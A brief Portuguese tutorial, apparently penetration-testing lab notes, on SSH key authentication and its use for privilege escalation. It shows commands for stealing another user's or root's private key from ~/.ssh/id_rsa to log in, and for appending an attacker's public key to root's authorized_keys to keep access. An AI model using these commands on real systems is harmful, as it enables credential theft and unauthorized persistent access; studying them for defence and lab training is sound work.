# Chave SSH

A um tempo atrás falamos que existem 2 tipos de configuração SSH, por senha e por chaves, é hora de entender oque é uma configuração SSH usando chaves

Uma chave SSH é um tipo de criptografia assimétrica, é só isso, não tem muito o que dizer

## Escalonamento de privilégio usando chaves SSH

Se você puder ler o arquivo .ssh de algum usuário, pode ler as chaves privadas dele em `/home/user/.ssh/id_rsa` e usar elas para logar no servidor, se você conseguir ler o arquivo `/root/.ssh/id_rsa`, pode copiar ele e usar a flag -i no comando ssh para logar usando essa chave

```
[!bash!]$ vim id_rsa
[!bash!]$ chmod 600 id_rsa
[!bash!]$ ssh root@10.10.10.10 -i id_rsa
```

Usamos o comando chmod para deixar a chave mais restritiva, o ssh é tipo a policia, se eles suspeitarem de você você não passa

Se você tiver permissões de gravação no /users/.ssh, pode colocar sua chave pública no authorized_keys do usuário. Isso normalmente é usado depois de conseguir um shell como esse usuário. Isso não funcionaria sem o controle desse usuário, primeiro você precisa criar uma chave com ssh-keygen e a flag -f

```
[!bash!]$ ssh-keygen -f key

Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): *******
Enter same passphrase again: *******

Your identification has been saved in key
Your public key has been saved in key.pub
The key fingerprint is:
SHA256:...SNIP... user@parrot
The key's randomart image is:
+---[RSA 3072]----+
|   ..o.++.+      |
......
|     . ..oo+.    |
+----[SHA256]-----+

```

Isso te dá 2 arquivos: key e key.pub, você vai usar o arquivo key no comando ssh e key.pub você vai copiar no host remoto

`user@remotehost$ echo "ssh-rsa AAAAB......M= user@parrot" >> /root/.ssh/authorized_keys`

Agora o servidor permite fazer login usando a chave privada

`[!bash!]$ ssh root@10.10.10.10 -i key`



